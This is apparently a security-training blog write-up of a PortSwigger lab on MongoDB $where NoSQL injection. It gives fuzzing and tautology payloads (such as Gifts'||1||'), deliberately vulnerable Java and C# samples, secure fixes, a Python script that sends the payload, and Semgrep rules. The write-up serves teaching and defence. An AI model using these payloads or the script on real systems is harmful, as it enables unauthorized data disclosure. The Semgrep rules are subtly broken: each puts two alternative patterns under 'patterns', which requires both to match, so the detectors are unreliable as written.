---
title: "Lab 01: Detecting NoSQL Injection"
date: 2026-01-27
categories: [portswigger, NoSQL_injection] 
tags: [nosql, monngodb, injection]
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-23-lab2_api_testing/
---

## 1. Executive Summary

**Vulnerability:** NoSQL Injection (Syntax-Based).

**Description:** The application builds a database query by concatenating user input directly into a JavaScript expression executed by MongoDB (likely using the `$where` operator). Because MongoDB allows JavaScript execution for complex queries, an attacker can break out of the string literal and inject arbitrary boolean logic.

**Impact:** Information Disclosure. By injecting a "Always True" condition (Tautology), an attacker can bypass category filters and view unreleased or hidden products.

## 2. The Attack

**Objective:** Inject a JavaScript payload to force the database query to return all documents, revealing unreleased products.

1. **Reconnaissance (Fuzzing):**
    - I intercepted the request `GET /filter?category=Gifts`.
    - I appended a single quote `'`.
    - **Response:** The application returned a "SyntaxError: Unexpected token". This confirmed that the input is being interpreted as part of a code statement, likely JavaScript.
2. **Boolean Testing:**
    - I attempted to inject logic to confirm control over the query.
    - **False Condition:** `Gifts' && 0 && 'x` (Encoded: `Gifts'%20%26%26%200%20%26%26%20'x`)
        - Result: No products displayed. The query became `this.category == 'Gifts' && 0 && 'x'`, which is always False.
    - **True Condition:** `Gifts' && 1 && 'x`
        - Result: Products displayed. The query became `this.category == 'Gifts' && 1 && 'x'`, which is True for the "Gifts" category.
3. **Exploitation:**
    - To see *all* products (including unreleased ones that usually fail the default filter), I injected an OR condition that is always true.
    - **Payload:** `Gifts'||1||'`
    - **Resulting Query Logic:** `this.category == 'Gifts'||1||'`
    - Because `1` evaluates to True in JavaScript, the entire statement becomes True for every document in the database.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The flaw exists because the developer used the `$where` operator to filter results. `$where` takes a string of JavaScript and executes it for every document. By using string concatenation to build this JavaScript, the developer allows the user to alter the code structure.

### Java (Spring Data MongoDB)

```java
public List<Product> getProducts(String category) {
    // VULNERABLE: Concatenating input into a $where JavaScript string
    String query = "this.category == '" + category + "'";
    
    // The driver executes this JS on the MongoDB server
    return mongoTemplate.find(
        new Query(new Criteria("$where").is(query)), 
        Product.class
    );
}
```

**Technical Flow & Syntax Explanation:**

- **`this.category == '" + category + "'`**: The code manually builds a string. If `category` is `Gifts`, the string is `this.category == 'Gifts'`.
- **`$where`**: This is a MongoDB operator that accepts a JavaScript string. It is powerful but dangerous because it compiles and runs the string on the database server.
- **The Injection**: When the attacker sends `'||1||'`, the string becomes `this.category == ''||1||''`. In JavaScript, `||` is the OR operator. Since `1` is truthy, the entire expression evaluates to `true` regardless of the category value.

### C# (MongoDB Driver)

```csharp
public async Task<List<Product>> GetProductsAsync(string category)
{
    // VULNERABLE: Using the Where clause with a raw string expression
    var filter = new BsonDocument("$where", new BsonJavaScript($"this.category == '{category}'"));

    return await _collection.Find(filter).ToListAsync();
}
```

**Technical Flow & Syntax Explanation:**

- **`BsonJavaScript`**: Explicitly tells the driver to treat the content as executable code.
- **`$"this.category == '{category}'"`**: String interpolation inserts the user input directly into the code block.
- **Execution**: MongoDB iterates through every document in the collection, executes this JavaScript snippet against it, and returns the document if the snippet returns `true`.

### Mock PR Comment

The product filter uses the `$where` operator with string concatenation. This allows attackers to inject arbitrary JavaScript, potentially exposing all data.

**Recommendation:** Remove the `$where` operator entirely. Use the standard, structured query methods (like `Filters.eq` or Spring's `Criteria.where`) which treat input strictly as data, not code.

## 4. The Fix

**Explanation of the Fix:**
We must move away from "Query as Code" (JavaScript) to "Query as Data" (Structured Filters). Standard MongoDB drivers handle parameter binding automatically when using their built-in filter builders, ensuring input is treated as a literal string.

### Secure Java

```java
public List<Product> getProducts(String category) {
    // SECURE: Use the Criteria API
    // This generates a standard JSON query: { "category": category }
    Query query = new Query(Criteria.where("category").is(category));
    
    return mongoTemplate.find(query, Product.class);
}
```

**Technical Flow & Syntax Explanation:**

- **`Criteria.where("category").is(category)`**: This builds a BSON object `{ category: "value" }`.
- **Interpretation**: MongoDB treats the value of `category` as a literal string to match. If the user sends `'||1||'`, MongoDB simply looks for a product whose category is literally named `||1||`.

### Secure C#

```csharp
public async Task<List<Product>> GetProductsAsync(string category)
{
    // SECURE: Use the strong-typed Builder
    var filter = Builders<Product>.Filter.Eq(p => p.Category, category);

    return await _collection.Find(filter).ToListAsync();
}
```

**Technical Flow & Syntax Explanation:**

- **`Builders<Product>.Filter.Eq`**: This is the standard, secure way to query. It maps the C# property `p.Category` to the database field and safely binds the `category` variable as a value.

## 5. Automation

*A Python script that injects the tautology payload and checks for success.*

```python
#!/usr/bin/env python3
import argparse
import requests
import sys

def exploit_nosql_injection(url):
    # The endpoint usually looks like /filter?category=...
    target_url = f"{url.rstrip('/')}/filter"
    
    # Payload: '||1||'
    # Logic: Closes the string, ORs with 1 (True), ORs with the trailing quote
    payload = "Gifts'||1||'"
    
    params = {'category': payload}
    
    print(f"[*] Sending payload to: {target_url}")
    print(f"[*] Payload: {payload}")
    
    try:
        resp = requests.get(target_url, params=params)
        
        # In this lab, unreleased products might not have a distinct class,
        # but the success criteria is simply retrieving them.
        # We check for a 200 OK and a large response size or specific keyword.
        if resp.status_code == 200:
            print("[+] Request successful.")
            print("[*] Check the browser or response length to confirm unreleased products.")
            print(f"[*] Response Length: {len(resp.text)}")
            return
        else:
            print(f"[-] Failed. Status Code: {resp.status_code}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    args = ap.parse_args()

    exploit_nosql_injection(args.url)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules look for the usage of `$where` combined with variable interpolation, which is the signature of this vulnerability.*

### Java Rule

```yaml
rules:
  - id: java-mongo-where-injection
    languages: [java]
    message: "Detected potential NoSQL Injection using $where with concatenation."
    severity: ERROR
    patterns:
      - pattern: |
          new Criteria("$where").is($STR + $VAR)
      - pattern: |
          new Criteria("$where").is($STR.concat($VAR))
```

**Technical Flow & Syntax Explanation:**

- **`new Criteria("$where")`**: Targets the specific MongoDB operator that executes JavaScript.
- **`.is($STR + $VAR)`**: Flags cases where the JavaScript string is constructed using addition (concatenation) with a variable, implying user input might be mixed with code.

### C# Rule

```yaml
rules:
  - id: csharp-mongo-where-injection
    languages: [csharp]
    message: "Potential NoSQL Injection via BsonJavaScript and interpolation."
    severity: ERROR
    patterns:
      - pattern: |
          new BsonDocument("$where", new BsonJavaScript($"...{...}..."))
      - pattern: |
          new BsonDocument("$where", new BsonJavaScript($STR + $VAR))
```

**Technical Flow & Syntax Explanation:**

- **`BsonDocument("$where", ...)`**: Identifies manual construction of a `$where` query.
- **`$"...{...}..."`**: Detects C# string interpolation (`$""`) being used directly inside the `BsonJavaScript` constructor. This is unsafe because the variable content becomes part of the executable script.
